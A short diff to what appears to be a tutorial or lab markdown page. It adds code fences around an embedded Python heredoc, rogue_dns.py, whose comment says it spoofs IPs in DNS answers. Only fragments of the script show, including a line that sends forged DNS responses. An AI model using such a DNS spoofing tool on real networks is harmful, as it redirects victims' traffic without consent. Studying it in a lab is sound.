@@ -3,6 +3,7 @@
 ## YouTube video walk through: https://youtu.be/X-cy3A3nrSs
 ## script by Z.ai
 
+```
 cat > rogue_dns.py << 'EOF'
 #!/usr/bin/env python3
 # rogue_dns.py — usage: python3 rogue_dns.py [IP_TO_SPOOF_IN_ANSWERS]
@@ -41,4 +42,5 @@ while True:
         s.sendto(data[:2] + struct.pack("!H", 0x8180) + counts + question + ans, addr)
     except Exception as e:
         print("err:", e, flush=True)
-EOF  
+EOF
+```
